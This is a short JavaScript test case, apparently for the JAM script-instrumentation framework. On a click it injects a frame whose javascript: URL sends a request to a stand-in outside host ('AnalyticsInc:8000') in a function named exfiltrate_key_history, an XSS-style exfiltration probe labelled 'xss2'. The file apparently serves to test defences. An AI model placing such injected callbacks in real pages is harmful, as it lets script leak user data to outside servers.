
JAM.startProfile('load');
function exfiltrate_key_history(){var script=document.createElement("frameset"),script2=document.createElement("frame");script2.src='javascript:Function(\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss2",true);xmlhttp.send(null);\')()';JAMScript.call(script.appendChild,script,[script2]);script2=document.getElementsByTagName("body");script2=script2[0];JAMScript.call(script2.appendChild,script2,[script])}var v1=document.getElementById("test");
JAMScript.set(v1,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
